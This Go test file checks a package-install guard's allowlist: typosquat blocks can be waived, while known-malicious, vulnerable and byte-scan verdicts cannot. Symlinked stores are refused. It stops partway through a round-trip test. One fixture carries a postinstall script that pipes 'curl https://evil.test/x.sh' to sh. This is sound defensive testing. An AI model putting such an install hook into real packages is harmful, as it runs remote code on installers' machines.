package cli

// Tests for the local guard allowlist (guard_allow.go).
//
// The two load-bearing ones are TestGuardAllowlistClearsTyposquatBlock and
// TestGuardAllowlistNeverClearsKnownMalicious. Together they state the whole
// security boundary as behaviour rather than as a comment: an explicit local
// decision waives NAME-SIMILARITY INFERENCE, and it waives nothing else. If the
// second one ever fails, the escape hatch has become a malware bypass.

import (
	"bytes"
	"context"
	"encoding/json"
	"errors"
	"io/fs"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"testing"
	"time"

	"github.com/spf13/cobra"

	"github.com/chain305/chainsaw-core/telemetry"
)

// ── helpers ─────────────────────────────────────────────────────────────────

// withGuardAllowlistStore points every piece of guard-local state at a
// hermetic temp dir and returns the allowlist path. It also drops the
// process-wide read cache both before and after the test, so ordering between
// tests can never leak one test's allowlist into another's verdict.
func withGuardAllowlistStore(t *testing.T) string {
	t.Helper()
	dir := t.TempDir()
	t.Setenv("CHAINSAW_CONFIG_HOME", dir)
	path := filepath.Join(dir, "guard_allowlist.json")
	t.Setenv(guardAllowlistEnv, path)
	// A nonexistent known-malicious cache keeps newLocalGuard on the embedded
	// floor: deterministic, offline, and silent on stderr.
	t.Setenv(guardDBEnv, filepath.Join(dir, "absent-known-malicious.json"))
	t.Setenv(guardArtifactDirEnv, "")
	invalidateGuardAllowlistCache()
	t.Cleanup(invalidateGuardAllowlistCache)
	return path
}

// seedGuardAllowlist writes coordinates straight to the store, bypassing the
// command, so the eval-path tests measure the CONSULT and not the writer.
func seedGuardAllowlist(t *testing.T, path string, coordinates ...string) {
	t.Helper()
	f := guardAllowlistFile{Schema: guardAllowlistSchema}
	for _, c := range coordinates {
		spec, _, err := parseGuardCoordinate([]string{c})
		if err != nil {
			t.Fatalf("seed %q: %v", c, err)
		}
		f.Entries = append(f.Entries, guardAllowEntry{
			Ecosystem: spec.Ecosystem,
			Name:      spec.Name,
			Reason:    "seeded by test",
			AllowedAt: time.Now().UTC().Format(time.RFC3339),
		})
	}
	if err := writeGuardAllowlist(path, f); err != nil {
		t.Fatalf("seed allowlist: %v", err)
	}
	invalidateGuardAllowlistCache()
}

// newGuardAllowTestCmd builds a command carrying the local flags plus the root
// globals that emitAndGate / useJSON / outWriter consult.
func newGuardAllowTestCmd(t *testing.T) (*cobra.Command, *bytes.Buffer) {
	t.Helper()
	cmd := &cobra.Command{Use: "allow"}
	cmd.Flags().Bool("list", false, "")
	cmd.Flags().Bool("remove", false, "")
	cmd.Flags().Bool("json", false, "")
	cmd.Flags().String("format", "table", "")
	cmd.Flags().String("output", "", "")
	var buf bytes.Buffer
	cmd.SetOut(&buf)
	cmd.SetErr(&buf)
	return cmd, &buf
}

func exitCodeOf(t *testing.T, err error) int {
	t.Helper()
	if err == nil {
		return ExitOK
	}
	var coded *ExitCodeError
	if !errors.As(err, &coded) {
		t.Fatalf("error %v is not an *ExitCodeError; Execute() cannot give it a documented exit code", err)
	}
	return coded.Code
}

// ── SECURITY DELIVERABLE 1: a typosquat verdict IS cleared ──────────────────

// TestGuardAllowlistClearsTyposquatBlock is the whole point of the feature. It
// first proves the coordinate really does block WITHOUT an entry — otherwise a
// future corpus change could make this pass by accident, testing nothing.
func TestGuardAllowlistClearsTyposquatBlock(t *testing.T) {
	path := withGuardAllowlistStore(t)
	ctx := context.Background()
	spec := packageSpec{Ecosystem: "npm", Name: "lodahs"}

	before := newLocalGuard().evaluate(ctx, spec)
	if !before.Block || !guardAllowlistableSeverity(before.Severity) {
		t.Fatalf("fixture no longer blocks as a typosquat (%+v); re-pick a name that does, "+
			"or this test proves nothing", before)
	}

	seedGuardAllowlist(t, path, "npm:lodahs")

	after := newLocalGuard().evaluate(ctx, spec)
	if after.Block {
		t.Fatalf("allowlisted %s still blocks: %+v", guardAllowCoordinate(spec), after)
	}
	// The waiver clears the whole typosquat lane, warn included: a user who
	// said "this is a real package" should not keep getting told it might not
	// be, every single install.
	if after.Severity != "" || after.Reason != "" {
		t.Errorf("allowlisted package still carries a typosquat verdict: %+v", after)
	}

	// And the waiver is per-coordinate, not a blanket off-switch: a DIFFERENT
	// typosquat still blocks with the same allowlist in place.
	other := newLocalGuard().evaluate(ctx, packageSpec{Ecosystem: "npm", Name: "loadash"})
	if !other.Block {
		t.Errorf("allowing one coordinate disabled the typosquat lane for another: %+v", other)
	}
}

// TestGuardWaivedTyposquatIsAnnounced is the fix for the adversarial pass's
// "a waived block is completely silent" finding. A cleared verdict used to
// produce no output line at all, so an install with a planted allowlist entry
// was byte-identical to one the guard never had an opinion about. One line of
// local JSON was a permanent, invisible hole, and `guard allow --list` — a
// command nobody runs on a machine they do not already suspect — was the only
// surface that revealed it.
//
// Three things are pinned: the suppressed verdict rides back on the verdict
// that was returned, the printer says so, and --quiet does not silence it.
func TestGuardWaivedTyposquatIsAnnounced(t *testing.T) {
	path := withGuardAllowlistStore(t)
	ctx := context.Background()
	spec := packageSpec{Ecosystem: "npm", Name: "lodahs"}

	before := newLocalGuard().evaluate(ctx, spec)
	if !before.Block {
		t.Fatalf("fixture no longer blocks (%+v); this test would prove nothing", before)
	}

	seedGuardAllowlist(t, path, "npm:lodahs")
	v := newLocalGuard().evaluate(ctx, spec)
	if v.Block {
		t.Fatalf("the waiver stopped working: %+v", v)
	}
	if v.WaivedSeverity != guardSeverityTyposquatHigh {
		t.Fatalf("the suppressed verdict was thrown away: WaivedSeverity = %q, want %q (%+v)",
			v.WaivedSeverity, guardSeverityTyposquatHigh, v)
	}
	if !strings.Contains(v.WaivedReason, "lodash") {
		t.Errorf("the waiver does not carry the verdict it suppressed: %q", v.WaivedReason)
	}

	render := func(t *testing.T, isQuiet bool) string {
		t.Helper()
		var buf bytes.Buffer
		printGuardVerdicts(&buf, "chainsaw", []guardVerdict{v}, isQuiet)
		return buf.String()
	}
	assertAnnounced := func(t *testing.T, body string) {
		t.Helper()
		for _, want := range []string{"waived", "npm:lodahs", v.WaivedReason, "guard allow --remove npm:lodahs"} {
			if !strings.Contains(body, want) {
				t.Fatalf("the waiver notice is missing %q — a person scrolling install output "+
					"cannot tell this package was cleared by a local file:\n%s", want, body)
			}
		}
	}

	t.Run("the install output names the waiver", func(t *testing.T) {
		assertAnnounced(t, render(t, false))
	})

	// --quiet MUST NOT silence it. INVARIANT D silences chatter; this is the
	// opposite of chatter — it is the only line separating "the guard had no
	// opinion" from "the guard had one and a file on this machine overruled it",
	// and CI, where a planted entry does the most damage, is exactly where
	// --quiet is the mode people run. Its volume is bounded by the allowlist,
	// which a human types one coordinate at a time.
	t.Run("and --quiet does not silence it", func(t *testing.T) {
		assertAnnounced(t, render(t, true))
	})

	// The other half of the decision, pinned as behaviour so it cannot drift:
	// a waiver is NOT a block, so it earns no `chainsaw why` row and no
	// telemetry. See guardVerdict.WaivedSeverity for the reasoning — briefly,
	// RecentBlocks would make `why` report a refusal that never happened and
	// would evict real blocks from a 25-slot ring, and the block event stream
	// carries package NAMES under a consent prompt written about blocks; a name
	// the user singled out and vouched for is more sensitive than one that was
	// refused, not less.
	t.Run("but it is not a block: no why row, no telemetry", func(t *testing.T) {
		hermeticGuard(t, consentGranted)
		t.Setenv("CHAINSAW_NO_NUDGE", "1")
		events, restore := captureGuardEmits(t)
		defer restore()

		processGuardOutcome("npm", []guardVerdict{v}, false)

		if st := loadGuardState(); len(st.RecentBlocks) != 0 {
			t.Errorf("a waived verdict was recorded as a block for `chainsaw why`: %+v", st.RecentBlocks)
		}
		if n := countEvents(*events, telemetry.EventInstallGuardBlock); n != 0 {
			t.Errorf("a waived package name was emitted on the block telemetry stream (%d events)", n)
		}
	})
}

// ── SECURITY DELIVERABLE 2: a known-malicious hit is NEVER cleared ──────────

// TestGuardAllowlistNeverClearsKnownMalicious is the test that must never be
// deleted or weakened. A known-malicious feed hit is ground truth about a
// published incident; if a local allowlist could clear it, `chainsaw guard
// allow npm:<anything>` would be a one-line malware bypass — and the command
// exists precisely to be run by a user who is frustrated and in a hurry.
//
// Both halves are asserted: the entry is inert at INSTALL time, and the write
// path refuses to record it in the first place, so the user is told the truth
// immediately instead of believing they fixed something.
func TestGuardAllowlistNeverClearsKnownMalicious(t *testing.T) {
	path := withGuardAllowlistStore(t)
	ctx := context.Background()

	// Coordinates from the embedded known-malicious FLOOR that are malicious at
	// every version, so the version-less allowlist entry covers them exactly.
	malicious := []packageSpec{
		{Ecosystem: "npm", Name: "flatmap-stream"},
		{Ecosystem: "pip", Name: "colourama"},
		{Ecosystem: "pip", Name: "python3-dateutil"},
	}

	coordinates := make([]string, 0, len(malicious))
	for _, spec := range malicious {
		coordinates = append(coordinates, guardAllowCoordinate(spec))
	}
	seedGuardAllowlist(t, path, coordinates...)

	g := newLocalGuard()
	for _, spec := range malicious {
		t.Run("install/"+guardAllowCoordinate(spec), func(t *testing.T) {
			v := g.evaluate(ctx, spec)
			if !v.Block || v.Severity != "malicious" {
				t.Fatalf("ALLOWLIST CLEARED A KNOWN-MALICIOUS PACKAGE. %s → %+v; "+
					"want Block=true Severity=malicious", guardAllowCoordinate(spec), v)
			}
			// The predicate itself, stated directly, so a refactor that moves
			// the consult still fails here rather than silently widening it.
			if guardAllowlistClears(spec, "malicious") {
				t.Fatal("guardAllowlistClears reported that an allowlist entry clears severity \"malicious\"")
			}
		})
	}

	// The write path refuses too. Start from a clean store so "nothing was
	// written" is checkable.
	writePath := withGuardAllowlistStore(t)
	cmd, out := newGuardAllowTestCmd(t)
	err := runGuardAllow(cmd, []string{"npm:flatmap-stream"})
	if code := exitCodeOf(t, err); code != ExitBlocked {
		t.Fatalf("`guard allow npm:flatmap-stream` exit = %d, want ExitBlocked(%d) (err=%v)", code, ExitBlocked, err)
	}
	if body := out.String(); !strings.Contains(body, "Refusing to allow npm:flatmap-stream") {
		t.Errorf("refusal did not say plainly that the coordinate cannot be allowed:\n%s", body)
	}
	if _, statErr := os.Stat(writePath); !os.IsNotExist(statErr) {
		t.Errorf("a refused `guard allow` wrote %s; nothing should have been recorded", writePath)
	}
}

// TestGuardAllowlistNeverClearsKnownVulnerable is the sibling boundary: an
// advisory about a specific version is evidence, not inference, and the
// allowlist is version-less — so clearing it would waive every future
// vulnerable release of a package the user vouched for once.
func TestGuardAllowlistNeverClearsKnownVulnerable(t *testing.T) {
	path := withGuardAllowlistStore(t)
	seedGuardAllowlist(t, path, "npm:pacote")

	spec := packageSpec{Ecosystem: "npm", Name: "pacote", Version: "11.2.7"}
	v := newLocalGuard().evaluate(context.Background(), spec)
	if !v.Block || v.Severity != "known-vulnerable" {
		t.Fatalf("allowlist cleared a known-vulnerable version: %+v", v)
	}
	if guardAllowlistClears(spec, "known-vulnerable") {
		t.Fatal("guardAllowlistClears reported that an entry clears severity \"known-vulnerable\"")
	}
}

// TestGuardAllowlistDoesNotMaskTheByteLevelScan pins the ORDERING the consult
// depends on. evaluate() has a documented past bug in this exact region: a
// name-level result short-circuited past the behavioral scan, so a warn masked
// a block. The allowlist reintroduces that risk in a new shape — a cleared
// typosquat must fall THROUGH to the bytes, exactly as a clean name does.
//
// The fixture is deliberately a package that is BOTH: a typosquat by name and
// a remote-fetch install script by bytes. Waiving the name must not waive the
// bytes.
func TestGuardAllowlistDoesNotMaskTheByteLevelScan(t *testing.T) {
	path := withGuardAllowlistStore(t)
	seedGuardAllowlist(t, path, "npm:lodahs")

	staged := t.TempDir()
	if err := os.MkdirAll(filepath.Join(staged, "npm"), 0o755); err != nil {
		t.Fatal(err)
	}
	tgz := makeTGZ(t, map[string]string{
		"package/package.json": `{"name":"lodahs","version":"1.0.0","scripts":{"postinstall":"curl https://evil.test/x.sh | sh"}}`,
	})
	if err := os.WriteFile(filepath.Join(staged, "npm", "lodahs-1.0.0.tgz"), tgz, 0o644); err != nil {
		t.Fatal(err)
	}
	t.Setenv(guardArtifactDirEnv, staged)

	spec := packageSpec{Ecosystem: "npm", Name: "lodahs", Version: "1.0.0"}
	v := newLocalGuard().evaluate(context.Background(), spec)
	if !v.Block || v.Severity != "behavioral-high" {
		t.Fatalf("an allowlisted NAME masked the byte-level scan: %+v; want a behavioral-high BLOCK", v)
	}
}

// ── the severity class ──────────────────────────────────────────────────────

// TestGuardAllowlistableSeverityVocabulary walks every severity string the
// guard can emit. This is the one place the boundary is written down as data,
// and it is what the write path, the install-path consult, and the block
// printer's hint all key on.
func TestGuardAllowlistableSeverityVocabulary(t *testing.T) {
	cases := map[string]bool{
		// Inference about a NAME — waivable.
		guardSeverityTyposquatHigh:   true,
		guardSeverityTyposquatMedium: true,
		// Evidence about a published incident — never waivable.
		"malicious":        false,
		"known-vulnerable": false,
		// Evidence read out of the package's BYTES, which change every
		// release; a version-less waiver would cover future ones.
		"behavioral-high":   false,
		"behavioral-medium": false,
		// The operator's own fail-closed posture, and the server preflight's
		// CVE rows. Neither is a local inference to waive.
		"coverage":      false,
		"server-high":   false,
		"server-medium": false,
		// A verdict with no severity is an ALLOW; there is nothing to clear.
		"": false,
	}
	for severity, want := range cases {
		if got := guardAllowlistableSeverity(severity); got != want {
			t.Errorf("guardAllowlistableSeverity(%q) = %v, want %v", severity, got, want)
		}
	}
}

// TestGuardAllowlistSeverityStringsMatchTheEvaluator pins the constants in
// guard_allow.go against the strings evaluate() actually emits. A rename in
// guard_eval.go would otherwise leave the escape hatch and its hint silently
// inapplicable — the guard would keep blocking and stop saying how to proceed.
func TestGuardAllowlistSeverityStringsMatchTheEvaluator(t *testing.T) {
	withGuardAllowlistStore(t)
	ctx := context.Background()
	g := newLocalGuard()

	blocked := g.evaluate(ctx, packageSpec{Ecosystem: "npm", Name: "lodahs"})
	if blocked.Severity != guardSeverityTyposquatHigh {
		t.Errorf("typosquat BLOCK severity = %q, but guard_allow.go expects %q",
			blocked.Severity, guardSeverityTyposquatHigh)
	}
	// `nano` is the false-block class the gate demoted to warn — the exact
	// case this escape hatch exists for, so it doubles as a fixture here.
	warned := g.evaluate(ctx, packageSpec{Ecosystem: "npm", Name: "nano"})
	if warned.Block {
		t.Fatalf("nano blocks again (%+v); the block-lane gate regressed", warned)
	}
	// The gate downgraded it, so it carries the DEMOTED severity — its own
	// string precisely so guard_install.go can keep it out of the --quiet
	// suppression that covers ordinary medium-confidence chatter.
	if warned.Severity != guardSeverityTyposquatDemoted {
		t.Errorf("gate-demoted WARN severity = %q, but guard_allow.go expects %q",
			warned.Severity, guardSeverityTyposquatDemoted)
	}
	// Both warn strings must stay inside the allowlistable family: a user who
	// waives the coordinate should silence either one.
	for _, sev := range []string{guardSeverityTyposquatMedium, guardSeverityTyposquatDemoted} {
		if !guardAllowlistableSeverity(sev) {
			t.Errorf("%q must remain in the allowlistable typosquat family", sev)
		}
	}
}

// ── the store ───────────────────────────────────────────────────────────────

// TestGuardAllowlistUnusableFileDegradesToEmpty covers every way the store can
// be unreadable. All of them must degrade to an EMPTY allowlist — waiving
// nothing — and never to "allow everything", never to a panic.
func TestGuardAllowlistUnusableFileDegradesToEmpty(t *testing.T) {
	blocked := packageSpec{Ecosystem: "npm", Name: "lodahs"}

	cases := []struct {
		name  string
		write func(t *testing.T, path string)
		skip  func() bool
	}{
		{name: "absent", write: func(*testing.T, string) {}},
		{name: "not json", write: func(t *testing.T, path string) {
			mustWrite(t, path, "this is not json at all")
		}},
		{name: "truncated mid-write", write: func(t *testing.T, path string) {
			mustWrite(t, path, `{"schema":1,"entries":[{"ecosystem":"npm","na`)
		}},
		{name: "json but wrong shape", write: func(t *testing.T, path string) {
			mustWrite(t, path, `["npm:lodahs"]`)
		}},
		{name: "empty file", write: func(t *testing.T, path string) {
			mustWrite(t, path, "")
		}},
		{name: "future schema", write: func(t *testing.T, path string) {
			mustWrite(t, path, `{"schema":99,"entries":[{"ecosystem":"npm","name":"lodahs"}]}`)
		}},
		{name: "unreadable", skip: func() bool { return os.Geteuid() == 0 || runtime.GOOS == "windows" },
			write: func(t *testing.T, path string) {
				mustWrite(t, path, `{"schema":1,"entries":[{"ecosystem":"npm","name":"lodahs"}]}`)
				if err := os.Chmod(path, 0o000); err != nil {
					t.Fatal(err)
				}
				t.Cleanup(func() { _ = os.Chmod(path, 0o600) })
			}},
		{name: "a directory where the file should be", write: func(t *testing.T, path string) {
			if err := os.MkdirAll(path, 0o755); err != nil {
				t.Fatal(err)
			}
		}},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if tc.skip != nil && tc.skip() {
				t.Skip("not meaningful in this environment")
			}
			path := withGuardAllowlistStore(t)
			tc.write(t, path)
			invalidateGuardAllowlistCache()

			load := loadGuardAllowlist()
			if len(load.Set) != 0 {
				t.Fatalf("an unusable store produced %d live entries: %v", len(load.Set), load.Set)
			}
			if guardAllowlistClears(blocked, guardSeverityTyposquatHigh) {
				t.Fatal("an unusable store waived a verdict")
			}
			v := newLocalGuard().evaluate(context.Background(), blocked)
			if !v.Block {
				t.Fatalf("an unusable store turned a block into a pass: %+v", v)
			}
			// Anything that IS on disk but unusable has to be reportable, or a
			// user whose cleared false block silently came back has no way to
			// find out why.
			if tc.name != "absent" && load.Problem == "" {
				t.Errorf("an unusable store reported no problem; `guard allow --list` would say nothing")
			}
		})
	}
}

// TestGuardAllowlistRefusesASymlinkedStore is the fix for the adversarial
// pass's file-clobber finding. `guard allow` wrote with os.WriteFile + os.Chmod
// on the resolved path, both of which FOLLOW a symlink — so a link planted at
// ~/.chainsaw/guard_allowlist.json turned the escape hatch into a truncate,
// overwrite and chmod-0600 of whatever it pointed at, with partly
// attacker-chosen JSON as the payload.
//
// The canary is the whole test: after a `guard allow` that resolves through the
// link, the file on the other end must be byte-for-byte and mode-for-mode what
// it was, and the command must have said no.
func TestGuardAllowlistRefusesASymlinkedStore(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("symlink creation needs privilege on Windows; the POSIX path is the exposure")
	}

	t.Run("the write path refuses and the link target is untouched", func(t *testing.T) {
		path := withGuardAllowlistStore(t)
		canary := filepath.Join(filepath.Dir(path), "canary.conf")
		const canaryBody = "# a file that is not chainsaw's to write\nkeep = me\n"
		if err := os.WriteFile(canary, []byte(canaryBody), 0o644); err != nil {
			t.Fatal(err)
		}
		if err := os.Symlink(canary, path); err != nil {
			t.Fatalf("planting the symlink: %v", err)
		}

		cmd, out := newGuardAllowTestCmd(t)
		err := runGuardAllow(cmd, []string{"npm:nano"})
		if code := exitCodeOf(t, err); code != ExitOpError {
			t.Fatalf("`guard allow` through a symlink exit = %d, want ExitOpError(%d) (err=%v, output=%s)",
				code, ExitOpError, err, out.String())
		}
		if err == nil || !strings.Contains(err.Error(), "symbolic link") {
			t.Errorf("the refusal does not say WHY: %v", err)
		}

		body, readErr := os.ReadFile(canary)
		if readErr != nil {
			t.Fatalf("the canary is gone entirely: %v", readErr)
		}
		if string(body) != canaryBody {
			t.Fatalf("`guard allow` wrote THROUGH the symlink — the canary now reads:\n%s", body)
		}
		info, statErr := os.Stat(canary)
		if statErr != nil {
			t.Fatal(statErr)
		}
		if got := info.Mode().Perm(); got != 0o644 {
			t.Errorf("`guard allow` chmod'ed the link target to %04o; it was 0644", got)
		}
		// And nothing was recorded anywhere: a refused write must not leave the
		// user believing the coordinate is now allowed.
		invalidateGuardAllowlistCache()
		if guardAllowlistClears(packageSpec{Ecosystem: "npm", Name: "nano"}, guardSeverityTyposquatHigh) {
			t.Error("a refused write still produced a live waiver")
		}
	})

	t.Run("the read path degrades to an empty allowlist", func(t *testing.T) {
		// Weaker exposure than the write — reading through a link clobbers
		// nothing — but a link is how a file OUTSIDE the config dir (a
		// world-writable /tmp path, another account's home) gets to decide which
		// packages this machine stops refusing, with nothing ever written where
		// the user would look. Fail-closed, like every other unusable store.
		path := withGuardAllowlistStore(t)
		elsewhere := filepath.Join(filepath.Dir(path), "elsewhere.json")
		mustWrite(t, elsewhere, `{"schema":1,"entries":[{"ecosystem":"npm","name":"lodahs"}]}`)
		if err := os.Symlink(elsewhere, path); err != nil {
			t.Fatalf("planting the symlink: %v", err)
		}
		invalidateGuardAllowlistCache()

		load := loadGuardAllowlist()
		if len(load.Set) != 0 {
			t.Fatalf("a symlinked store produced %d live entries: %v", len(load.Set), load.Set)
		}
		if load.Problem == "" {
			t.Error("a symlinked store reported no problem; `guard allow --list` would say nothing")
		}
		v := newLocalGuard().evaluate(context.Background(), packageSpec{Ecosystem: "npm", Name: "lodahs"})
		if !v.Block {
			t.Fatalf("a symlinked store waived a verdict: %+v", v)
		}
	})

	t.Run("a normal write leaves no temp file behind", func(t *testing.T) {
		// The fix writes through a temp file in the same directory and renames.
		// A leftover .tmp would be 0600 data about this machine's exemptions
		// sitting next to the store forever.
		path := withGuardAllowlistStore(t)
		seedGuardAllowlist(t, path, "npm:lodahs")
		entries, err := os.ReadDir(filepath.Dir(path))
		if err != nil {
			t.Fatal(err)
		}
		for _, e := range entries {
			if strings.HasSuffix(e.Name(), ".tmp") {
				t.Errorf("a successful write left %s behind", e.Name())
			}
		}
	})
}

func mustWrite(t *testing.T, path, body string) {
	t.Helper()
	if err := os.WriteFile(path, []byte(body), 0o600); err != nil {
		t.Fatal(err)
	}
}

// TestGuardAllowlistFileIsPrivateAndCreatesParents pins the two filesystem
// properties. The re-tighten half matters because os.WriteFile only applies
// its perm argument when it CREATES the file: a store that already exists with
// a loose mode would otherwise stay group-writable forever, and this file
// decides which packages a machine has stopped refusing.
func TestGuardAllowlistFileIsPrivateAndCreatesParents(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("POSIX file modes are not meaningful on Windows")
	}
	dir := t.TempDir()
	t.Setenv("CHAINSAW_CONFIG_HOME", dir)
	nested := filepath.Join(dir, "deeply", "nested", "guard_allowlist.json")
	t.Setenv(guardAllowlistEnv, nested)
	t.Setenv(guardDBEnv, filepath.Join(dir, "absent.json"))
	invalidateGuardAllowlistCache()
	t.Cleanup(invalidateGuardAllowlistCache)

	seedGuardAllowlist(t, nested, "npm:lodahs")

	assertMode := func(want fs.FileMode) {
		t.Helper()
		info, err := os.Stat(nested)
		if err != nil {
			t.Fatalf("stat %s: %v", nested, err)
		}
		if got := info.Mode().Perm(); got != want {
			t.Fatalf("allowlist mode = %04o, want %04o", got, want)
		}
	}
	assertMode(0o600)

	// Loosen it by hand, then write again: the next write must tighten it.
	if err := os.Chmod(nested, 0o644); err != nil {
		t.Fatal(err)
	}
	seedGuardAllowlist(t, nested, "npm:lodahs", "pip:reqeusts")
	assertMode(0o600)
}

// TestGuardAllowlistCacheIsInvalidatedOnWrite guards the one place the
// per-process read cache could bite: a write followed by a read in the same
// process (a script running `guard allow` then an install through the same
// binary) must see the new entry, not the cached absence.
func TestGuardAllowlistCacheIsInvalidatedOnWrite(t *testing.T) {
	path := withGuardAllowlistStore(t)
	spec := packageSpec{Ecosystem: "npm", Name: "lodahs"}

	if guardAllowlistClears(spec, guardSeverityTyposquatHigh) {
		t.Fatal("empty store reported a waiver")
	}
	seedGuardAllowlist(t, path, "npm:lodahs")
	if !guardAllowlistClears(spec, guardSeverityTyposquatHigh) {
		t.Fatal("a write did not invalidate the read cache; the entry was invisible to the same process")
	}
}

// ── coordinates ─────────────────────────────────────────────────────────────

func TestParseGuardCoordinate(t *testing.T) {
	ok := []struct {
		name        string
		args        []string
		wantEco     string
		wantName    string
		wantVersion bool
	}{
		{"colon form", []string{"npm:nano"}, "npm", "nano", false},
		{"two token form", []string{"npm", "nano"}, "npm", "nano", false},
		{"registry alias", []string{"pypi:reqeusts"}, "pip", "reqeusts", false},
		{"crates alias", []string{"crates-io:serfe"}, "cargo", "serfe", false},
		{"gem alias", []string{"gem:rials"}, "rubygems", "rials", false},
		{"case folds on the ecosystem", []string{"NPM:nano"}, "npm", "nano", false},
		// A scoped npm name keeps its leading @ — the scope marker is not a
		// version separator.
		{"npm scope", []string{"npm:@babel/core"}, "npm", "@babel/core", false},
		{"npm scope with version", []string{"npm:@babel/core@7.24.0"}, "npm", "@babel/core", true},
		{"version dropped", []string{"npm:nano@1.2.3"}, "npm", "nano", true},
		{"pip pin dropped", []string{"pip:reqeusts==2.31.0"}, "pip", "reqeusts", true},
		{"gem colon pin dropped", []string{"rubygems:rials:7.1.0"}, "rubygems", "rials", true},
		{"go module path", []string{"go:github.com/x/y"}, "go", "github.com/x/y", false},
		{"go module path with version", []string{"go:github.com/x/y@v1.2.3"}, "go", "github.com/x/y", true},
		{"whitespace trimmed", []string{"  npm : nano "}, "npm", "nano", false},
	}
	for _, tc := range ok {
		t.Run(tc.name, func(t *testing.T) {
			spec, hadVersion, err := parseGuardCoordinate(tc.args)
			if err != nil {
				t.Fatalf("parseGuardCoordinate(%v): %v", tc.args, err)
			}
			if spec.Ecosystem != tc.wantEco || spec.Name != tc.wantName {
				t.Errorf("= %s:%s, want %s:%s", spec.Ecosystem, spec.Name, tc.wantEco, tc.wantName)
			}
			if hadVersion != tc.wantVersion {
				t.Errorf("hadVersion = %v, want %v", hadVersion, tc.wantVersion)
			}
			// The entry a user creates must key identically to the coordinate
			// the block printer told them to type.
			if got := guardAllowCoordinate(spec); got != tc.wantEco+":"+tc.wantName {
				t.Errorf("round-trip coordinate = %q, want %q", got, tc.wantEco+":"+tc.wantName)
			}
		})
	}

	bad := []struct {
		name string
		args []string
	}{
		{"no separator", []string{"nano"}},
		{"empty ecosystem", []string{":nano"}},
		{"empty name", []string{"npm:"}},
		{"unknown ecosystem", []string{"maven:com.foo"}},
		{"ecosystem typo", []string{"nmp:nano"}},
		{"nothing at all", []string{""}},
		{"too many tokens", []string{"npm", "nano", "extra"}},
	}
	for _, tc := range bad {
		t.Run("rejects/"+tc.name, func(t *testing.T) {
			if spec, _, err := parseGuardCoordinate(tc.args); err == nil {
				t.Fatalf("parseGuardCoordinate(%v) accepted %s:%s; a coordinate the guard can never "+
					"produce would be recorded as a permanently inert row", tc.args, spec.Ecosystem, spec.Name)
			}
		})
	}
}

// TestGuardAllowlistEcosystemsCoverEveryWrapper is the drift guard for
// guardAllowlistEcosystems. Every guard wrapper stamps an ecosystem onto its
// specs; if one is missing from the map, `guard allow` refuses a coordinate
// the guard genuinely blocks — the escape hatch would be unreachable for that
// whole ecosystem.
func TestGuardAllowlistEcosystemsCoverEveryWrapper(t *testing.T) {
	wrappers := []struct {
		bin   string
		args  []string
		parse specParser
	}{
		{"npm", []string{"install", "lodash"}, parseNpmInstall},
		{"pip", []string{"install", "requests"}, parsePipInstall},
		{"go", []string{"get", "github.com/x/y@v1.2.3"}, parseGoGet},
		{"cargo", []string{"install", "ripgrep"}, parseCargoInstall},
		{"gem", []string{"install", "rails"}, parseGemInstall},
	}
	for _, w := range wrappers {
		specs, ok := w.parse(w.args)
		if !ok || len(specs) == 0 {
			t.Fatalf("%s: fixture `%s %s` no longer parses as an install", w.bin, w.bin, strings.Join(w.args, " "))
		}
		for _, s := range specs {
			if !guardAllowlistEcosystems[guardCanonicalEcosystem(s.Ecosystem)] {
				t.Errorf("the %s wrapper emits ecosystem %q, which guardAllowlistEcosystems does not list — "+
					"`chainsaw guard allow %s:<name>` would be refused as an unknown ecosystem",
					w.bin, s.Ecosystem, s.Ecosystem)
			}
		}
	}
}

// ── the command surface ─────────────────────────────────────────────────────

func TestGuardAllowCommandIsRegisteredUnderGuard(t *testing.T) {
	found := false
	for _, c := range guardCmd.Commands() {
		if c.Name() == "allow" {
			found = true
		}
	}
	if !found {
		t.Fatal("`chainsaw guard allow` is not registered on guardCmd")
	}
	// The command must NOT declare its OWN --format: a local one silently opts
	// it out of the global format/output validation (see
	// output_flags_contract_test.go). Tested via ownsGlobalFlag's pointer
	// identity rather than a nil check, because cobra's mergePersistentFlags
	// copies the root's --format into every command's Flags() the first time
	// anything walks the tree — a nil check passes alone and fails in a full
	// suite run, which is the least useful shape a test can have.
	if guardAllowCmd.Flags().Lookup("format") != nil && !ownsGlobalFlag(guardAllowCmd, "format") {
		t.Error("guard allow declares a local --format flag; it should use the root's")
	}
}

// TestGuardAllowCommandRoundTrip drives the real add → list → remove cycle and
// checks the file is the auditable record it claims to be.
func TestGuardAllowCommandRoundTrip(t *testing.T) {
	path := withGuardAllowlistStore(t)
	ctx := context.Background()
	spec := packageSpec{Ecosystem: "npm", Name: "lodahs"}

	// add
	cmd, out := newGuardAllowTestCmd(t)
	if err := runGuardAllow(cmd, []string{"npm:lodahs"}); err != nil {
		t.Fatalf("guard allow: %v", err)
	}
	if body := out.String(); !strings.Contains(body, "Allowed npm:lodahs") {
		t.Errorf("add output did not confirm the coordinate:\n%s", body)
	}

	load := loadGuardAllowlist()
	if len(load.File.Entries) != 1 {
		t.Fatalf("want 1 entry, got %d", len(load.File.Entries))
	}
	e := load.File.Entries[0]
	if e.Ecosystem != "npm" || e.Name != "lodahs" {
		t.Errorf("entry coordinate = %s:%s", e.Ecosystem, e.Name)
	}
	// Trust on first use: the verdict text at the time it was allowed.
	if !strings.Contains(e.Reason, "typosquat") {
		t.Errorf("entry reason = %q, want the guard's verdict text at allow time", e.Reason)
	}
	if _, err := time.Parse(time.RFC3339, e.AllowedAt); err != nil {
		t.Errorf("allowed_at = %q, want RFC3339: %v", e.AllowedAt, err)
	}

	// the entry is live
	if v := newLocalGuard().evaluate(ctx, spec); v.Block {
		t.Fatalf("the recorded entry did not clear the block: %+v", v)
	}

	// re-allowing is idempotent and refreshes rather than duplicating
	cmd, out = newGuardAllowTestCmd(t)
	if err := runGuardAllow(cmd, []string{"npm", "lodahs"}); err != nil {
		t.Fatalf("re-allow: %v", err)
	}
	if body := out.String(); !strings.Contains(body, "Already allowed") {
		t.Errorf("re-allow did not report the entry already existed:\n%s", body)
	}
	if got := len(loadGuardAllowlist().File.Entries); got != 1 {
		t.Fatalf("re-allow duplicated the entry: %d rows", got)
	}

	// list
	cmd, out = newGuardAllowTestCmd(t)
